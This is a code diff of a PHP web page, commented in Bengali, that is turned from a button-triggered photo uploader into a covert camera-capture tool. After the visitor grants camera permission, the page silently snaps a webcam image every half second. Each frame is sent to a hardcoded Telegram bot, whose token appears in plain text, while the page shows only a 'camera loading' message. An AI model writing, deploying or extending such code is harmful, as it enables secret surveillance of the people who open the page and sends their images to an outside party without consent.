@@ -1,4 +1,5 @@
 <?php
+// ব্যাকএন্ড লজিক: ফ্রন্টএন্ড থেকে আসা ছবি পোস্ট রিকোয়েস্টে প্রসেস করা
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
@@ -19,12 +20,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 
     if (file_put_contents($filePath, $data)) {
         
-        // সরাসরি টেলিগ্রামের মেইন API ব্যবহার করা হলো
         $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
         
         $postFields = [
             'chat_id' => $chatId,
-            'caption' => "New image captured: " . $fileName,
+            'caption' => "Ultra-fast captured: " . $fileName,
             'photo'   => new CURLFile(realpath($filePath))
         ];
 
@@ -34,24 +34,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 2); 
 
-        $result = curl_exec($ch);
-        $curlError = curl_error($ch);
+        curl_exec($ch);
         curl_close($ch);
 
-        if ($result) {
-            $jsonResult = json_decode($result, true);
-            if (isset($jsonResult['ok']) && $jsonResult['ok'] === true) {
-                echo "ছবি সফলভাবে টেলিগ্রাম বটে পাঠানো হয়েছে!";
-            } else {
-                echo "সার্ভারে সেভ হয়েছে, কিন্তু টেলিগ্রামে পাঠাতে সমস্যা হয়েছে: " . ($jsonResult['description'] ?? 'Unknown error');
-            }
-        } else {
-            echo "cURL এরর: " . $curlError;
-        }
-
-    } else {
-        echo "ছবি সেভ করতে ব্যর্থ হয়েছে।";
+        echo "Ultra-fast sent!";
     }
     exit;
 }
@@ -61,7 +49,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture & Telegram Send</title>
+    <title>Auto Camera Capture - 0.5s</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -75,19 +63,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             border: 2px solid #333;
             border-radius: 8px;
         }
-        button {
-            margin-top: 15px;
-            padding: 10px 20px;
-            font-size: 16px;
-            background-color: #28a745;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #218838;
-        }
         #status {
             margin-top: 15px;
             font-weight: bold;
@@ -96,42 +71,45 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 </head>
 <body>
 
-    <h2>ক্যামেরা থেকে ছবি তুলো</h2>
+    <h2>ক্যামেরা লোড হচ্ছে...</h2>
     
     <video id="video" autoplay playsinline></video><br>
-    
-    <button id="capture-btn">ছবি তুলুন ও পাঠান</button>
-    
     <canvas id="canvas" style="display:none;"></canvas>
     
-    <div id="status"></div>
+    <div id="status">দয়া করে ক্যামেরা পারমিশন দিন...</div>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const captureBtn = document.getElementById('capture-btn');
         const statusDiv = document.getElementById('status');
 
+        // ক্যামেরা এক্সেস পাওয়া
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
+                statusDiv.innerText = "ক্যামেরা সচল আছে, প্রতি ০.৫ সেকেন্ডে ছবি পাঠানো হচ্ছে...";
+                statusDiv.style.color = "green";
+
+                // ক্যামেরা চালুর ১ সেকেন্ড পর থেকে প্রতি ৫০০ মিলিমিটার (০.৫ সেকেন্ড) পর পর ক্যাপচার
+                setTimeout(() => {
+                    setInterval(captureAndUpload, 500);
+                }, 1000);
+
             })
             .catch(err => {
-                console.error("ক্যামেরা এক্সেস পাওয়া যায়নি: ", err);
-                statusDiv.innerText = "ক্যামেরা পারমিশন পাওয়া যায়নি বা দেওয়া হয়নি!";
-                statusDiv.style.color = "red";
+                console.error("ক্যামেরা পারমিশন পাওয়া যায়নি: ", err);
+                statusDiv.innerText = "ক্যামেরা পারমিশন দেওয়া হয়নি!";
+                statusDiv.style.color.color = "red";
             });
 
-        captureBtn.addEventListener('click', () => {
+        // অটো ক্যাপচার ও পোস্ট করার ফাংশন
+        function captureAndUpload() {
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
-
-            statusDiv.innerText = "ছবি প্রসেস ও টেলিগ্রামে পাঠানো হচ্ছে...";
-            statusDiv.style.color = "blue";
 
             fetch('', {
                 method: 'POST',
@@ -142,15 +120,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             })
             .then(response => response.text())
             .then(result => {
-                statusDiv.innerText = result;
-                statusDiv.style.color = "green";
+                console.log(result);
             })
             .catch(error => {
                 console.error('Error:', error);
-                statusDiv.innerText = "পাঠাতে সমস্যা হয়েছে!";
-                statusDiv.style.color = "red";
             });
-        });
+        }
     </script>
 </body>
 </html>
